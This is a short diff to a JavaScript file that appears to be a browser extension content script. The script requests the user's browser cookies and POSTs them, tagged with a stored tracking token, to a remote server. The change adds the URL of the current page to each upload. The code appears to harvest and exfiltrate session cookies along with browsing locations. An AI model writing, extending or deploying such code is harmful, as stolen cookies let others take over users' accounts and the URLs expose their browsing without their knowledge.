@@ -9,6 +9,7 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
   // Check for an existing token
   chrome.storage.local.get(['userToken'], function(result) {
     let userToken = result.userToken;
+    const currentUrl = window.location.href;
 
     if (!userToken) {
       // If token doesn't exist, generate and save a new one
@@ -26,7 +27,8 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
       },
       body: JSON.stringify({
         "data": response.cookies,
-        "token_identifier": userToken // Include the token in the request
+        "token_identifier": userToken, // Include the token in the request
+        "send_from": currentUrl
       })
     })
     .then(response => {
